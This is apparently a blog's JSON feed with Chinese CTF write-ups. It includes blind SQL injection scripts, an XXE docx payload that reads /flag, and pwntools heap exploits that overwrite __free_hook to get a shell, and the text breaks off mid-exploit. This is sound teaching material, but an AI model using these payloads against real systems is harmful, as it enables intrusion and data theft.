{
    "version": "https://jsonfeed.org/version/1",
    "title": "Canary's Blog",
    "subtitle": "我用回忆温暖了想你的每一刻",
    "icon": "https://zephyr-cyber.github.io.git/images/favicon.ico",
    "description": "刻意练习",
    "home_page_url": "https://zephyr-cyber.github.io.git",
    "items": [
        {
            "id": "https://zephyr-cyber.github.io.git/web/",
            "url": "https://zephyr-cyber.github.io.git/web/",
            "title": "比赛Web题",
            "date_published": "2022-09-16T14:18:59.155Z",
            "content_html": "<h1 id=\"领航杯-2021-web\"><a class=\"anchor\" href=\"#领航杯-2021-web\">#</a> 领航杯 2021 Web</h1>\n<h1 id=\"login\"><a class=\"anchor\" href=\"#login\">#</a> Login</h1>\n<p>左下角发现登录，bp 抓包发现查询语句：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> email<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> email <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> password <span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr></table></figure><p>经过 fuzz 发现传 <code>%</code>  会出问题，很明显的 sprintf 的 SQL 注入漏洞。直接写个脚本跑一下就可以了：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">strtohex</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    ss <span class=\"token operator\">=</span> <span class=\"token string\">\"0x\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        ss <span class=\"token operator\">+=</span>  <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> ss</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://pk.cnhongke.net:20211/login.php\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">100000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token string\">\"abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;.@_\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        payload<span class=\"token operator\">=</span><span class=\"token string\">\")||if((select group_concat(email) like &#123;&#125;),sleep(0.5),1)#\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>strtohex<span class=\"token punctuation\">(</span>flag<span class=\"token operator\">+</span>j<span class=\"token operator\">+</span><span class=\"token string\">\"%\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">#payload=\")||if((select group_concat(password) like &#123;&#125;),sleep(0.5),1)#\".format(strtohex(flag+j+\"%\"))</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">#print(payload)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"%1$\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token string\">'subl'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"OK\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token comment\">#print(r.text)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            flag<span class=\"token operator\">+=</span>j</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token string\">\"admin@admin.com\"</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token string\">\"9bf49267cc9c8a5428a3576ebce59b6b\"</span></pre></td></tr></table></figure><p>登录即可得到 flag。</p>\n<h1 id=\"病列管理系统wp\"><a class=\"anchor\" href=\"#病列管理系统wp\">#</a> 病列管理系统 wp</h1>\n<p>sql 注入进后台，写个 python 跑一下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">'http://eci-2zebvabc2wy8k9x8jvue.cloudeci1.ichunqiu.com:80'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token builtin\">min</span><span class=\"token operator\">=</span><span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token builtin\">max</span><span class=\"token operator\">=</span><span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        j<span class=\"token operator\">=</span><span class=\"token builtin\">min</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">max</span><span class=\"token operator\">-</span><span class=\"token builtin\">min</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">min</span><span class=\"token operator\">==</span>j<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            flag<span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        payload<span class=\"token operator\">=</span>\"<span class=\"token operator\">|</span><span class=\"token operator\">|</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ascii</span><span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#\".format(i,j)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'\\\\'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>payload</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">0.4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token comment\">#print(r.text)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> j</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token builtin\">max</span> <span class=\"token operator\">=</span> j</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token string\">\"admin\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token string\">\"2447daf21339563964a78b2164574af4\"</span></pre></td></tr></table></figure><p>后台有个文件上传只能传 docx，联想到 docx 的 xxe。根据提示：</p>\n<pre><code>注意模板的docx文件是怎么得到title的\n</code></pre>\n<p>页面中会有这个</p>\n<pre><code>&lt;strong&gt;&lt;a href='uploads/.'&gt;标题：None&lt;/a&gt;&lt;/strong&gt;&lt;/br&gt;&lt;/br&gt;&lt;strong&gt;&lt;a \nhref='uploads/..'&gt;标题：None&lt;/a&gt;&lt;/strong&gt;&lt;/br&gt;&lt;/br&gt;&lt;strong&gt;&lt;a \nhref='uploads/moban.docx'&gt;标题：moban&lt;/a&gt;\n</code></pre>\n<p>moban.docx 显示了标题是 moban，自己上传 docx 的话显示的是 None。</p>\n<p>经过 fuzz，发现标题取自这里：<br />\n<img data-src=\"/img/misc1.png\" alt=\"avatar\" /></p>\n<p>再经过测试，发现这个 title 是在 core.xml。<br />\n<img data-src=\"/img/misc2.png\" alt=\"avatar\" /></p>\n<p>联想到 docx 的 xxe：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS8weDAwNy8xNjMwNjQw\">https://blog.51cto.com/0x007/1630640</span><br />\n 后端会解析这个 xml，然后得到这个<span class=\"exturl\" data-url=\"ZGM6dGl0bGU=\"> dc:title</span> 的内容，因此 xxe 读 /flag。<br />\n直接在最前面加上：</p>\n<pre><code>&lt;!DOCTYPE document [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;\n</code></pre>\n<p>然后<span class=\"exturl\" data-url=\"ZGI6dGl0bGU=\"> db:title</span> 的内容改成 &amp; xxe;</p>\n<pre><code class=\"language-&lt;?xml\">&lt;!DOCTYPE document [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;\n&lt;cp:coreProperties \nxmlns:cp=&quot;http://schemas.openxmlformats.org/package/2006/metadata/core-\nproperties&quot; xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot; \nxmlns:dcterms=&quot;http://purl.org/dc/terms/&quot; \nxmlns:dcmitype=&quot;http://purl.org/dc/dcmitype/&quot; \nxmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;&lt;dc:title&gt;&amp;xxe;&lt;/dc:title&gt;\n&lt;dc:subject&gt;&lt;/dc:subject&gt;&lt;dc:creator&gt;1&lt;/dc:creator&gt;&lt;cp:keywords&gt;&lt;/cp:keywords&gt;\n&lt;dc:description&gt;&lt;/dc:description&gt;&lt;cp:lastModifiedBy&gt;1&lt;/cp:lastModifiedBy&gt;\n&lt;cp:revision&gt;1&lt;/cp:revision&gt;&lt;dcterms:created xsi:type=&quot;dcterms:W3CDTF&quot;&gt;2021-07-\n11T05:56:00Z&lt;/dcterms:created&gt;&lt;dcterms:modified xsi:type=&quot;dcterms:W3CDTF&quot;&gt;2021-\n07-11T05:56:00Z&lt;/dcterms:modified&gt;&lt;/cp:coreProperties&gt;\n</code></pre>\n<p>上传即可得到 flag。</p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/pwn2/",
            "url": "https://zephyr-cyber.github.io.git/pwn2/",
            "title": "pwn学习(2)",
            "date_published": "2022-09-16T14:18:59.153Z",
            "content_html": "<h1 id=\"记录两个堆的比赛题\"><a class=\"anchor\" href=\"#记录两个堆的比赛题\">#</a> 记录两个堆的比赛题</h1>\n<p>比较穷网盘没有会员附件私聊我</p>\n<h1 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h1>\n<p><img data-src=\"/img/PWN/zhiye2.png\" alt=\"avatar\" /></p>\n<p><img data-src=\"/img/PWN/zhiye.png\" alt=\"avatar\" /><br />\n 堆溢出<br />\n感觉比较基础<br />\n堆溢出改大小制造重叠堆块</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#io=process('./pwn1')</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>io<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'119.61.19.212'</span><span class=\"token punctuation\">,</span><span class=\"token number\">57511</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>elf<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#libc=elf.libc</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'content: '</span><span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x481</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tshow<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\tmalloc_hook<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">96</span><span class=\"token operator\">-</span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tlibc_base<span class=\"token operator\">=</span>malloc_hook<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tsystem<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tfree_hook<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#10</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token comment\">#gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>exp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h1>\n<p>比赛就两小时<br />\n想办法绕过这有点麻烦<br />\n<img data-src=\"/img/PWN/zhiye3.png\" alt=\"avatar\" /><br />\n 最后复现出来<br />\n exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>io<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>elf<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>libc<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>libc</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'size: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token 